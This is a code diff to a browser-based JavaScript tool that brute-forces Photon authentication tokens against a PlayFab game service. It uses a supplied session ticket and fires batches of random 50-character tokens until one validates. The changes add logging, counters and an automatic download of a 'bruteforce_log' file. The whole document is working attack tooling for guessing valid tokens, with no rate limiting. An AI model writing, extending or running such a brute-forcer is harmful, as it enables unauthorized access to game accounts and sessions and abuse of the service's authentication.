@@ -460,6 +460,8 @@
     let photonTokenRunning = false;
     let photonTokenIntervalId = null;
     let failedAttempts = 0;
+    const logEntries = [];
+    let totalTokensGenerated = 0;
 
     function setSessionTicket() {
       sessionTicket = document.getElementById("sessionTicketInput").value.trim();
@@ -1495,11 +1497,12 @@
 
  function generateRandomToken() {
   const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-  const tokenLength = 50; // Standard UUID-like length for Photon tokens
+  const tokenLength = 50;
   let token = '';
   for (let i = 0; i < tokenLength; i++) {
     token += chars.charAt(Math.floor(Math.random() * chars.length));
   }
+  totalTokensGenerated++;
   return token;
 }
 
@@ -1512,10 +1515,24 @@ async function checkToken(playFabId, token) {
         'X-Authorization': sessionTicket
       }
     });
-    return { token, result: await response.json() };
+    const result = await response.json();
+    return { token, result };
   } catch (error) {
     return { token, error: error.message };
   }
+}
+
+function downloadLog() {
+  const logContent = logEntries.join('\n');
+  const blob = new Blob([logContent], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `bruteforce_log_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
 }
 
 async function startBruteforce() {
@@ -1535,8 +1552,10 @@ async function startBruteforce() {
   }
 
   bruteforceRunning = true;
-  failedAttempts = 0; // Reset failed attempts counter
-  let foundValid = false; // Declare foundValid here
+  failedAttempts = 0;
+  totalTokensGenerated = 0;
+  logEntries.length = 0; // Clear previous logs
+  let foundValid = false;
   output.textContent = "Token bruteforcer enabled! We will notify you when we find a valid token.\n";
 
   async function tryTokenBatch() {
@@ -1550,13 +1569,19 @@ async function startBruteforce() {
 
     for (const { token, result, error } of results) {
       if (error) {
-        outputBuffer.push(`Error for token ${token}: ${error}`);
-        failedAttempts++; // Increment failed attempts
-      } else if (result.resultCode === 1) {
-        outputBuffer.push(`✅ Valid token found: ${token} (Failed Attempts: ${failedAttempts})`);
-        foundValid = true;
+        failedAttempts++;
+        const logEntry = `Error for token ${token}: ${error}`;
+        logEntries.push(logEntry);
+        outputBuffer.push(logEntry);
       } else {
-        failedAttempts++; // Increment failed attempts for invalid tokens
+        const logEntry = `Token: ${token}, ResultCode: ${result.resultCode}, Response: ${JSON.stringify(result)}`;
+        logEntries.push(logEntry);
+        if (result.resultCode === 1) {
+          outputBuffer.push(`✅ Valid token found: ${token} (Failed Attempts: ${failedAttempts})`);
+          foundValid = true;
+        } else {
+          failedAttempts++;
+        }
       }
     }
 
@@ -1565,16 +1590,23 @@ async function startBruteforce() {
       output.scrollTop = output.scrollHeight;
     }
 
-    if (!foundValid && bruteforceRunning) {
-      setTimeout(tryTokenBatch, 0); // Delay to prevent rate limiting
-    } else if (foundValid) {
+    if (foundValid) {
+      output.textContent += `Valid token found: ${results.find(r => r.result?.resultCode === 1).token}\n`;
+      logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
+      downloadLog();
       stopBruteforce();
+    } else if (bruteforceRunning) {
+      setTimeout(tryTokenBatch, 0);
     }
   }
 
   tryTokenBatch().catch(error => {
-    output.textContent += `Batch error: ${error.message}\n`;
+    const errorMsg = `Batch error: ${error.message}`;
+    logEntries.push(errorMsg);
+    output.textContent += errorMsg + '\n';
     output.scrollTop = output.scrollHeight;
+    logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
+    downloadLog();
     stopBruteforce();
   });
 }
@@ -1584,6 +1616,8 @@ function stopBruteforce() {
   const output = document.getElementById("bruteforceOutput");
   output.textContent += `Photon token bruteforce stopped. Failed Attempts: ${failedAttempts}\n`;
   output.scrollTop = output.scrollHeight;
+  logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
+  downloadLog();
 }
 
     document.addEventListener("DOMContentLoaded", function() {
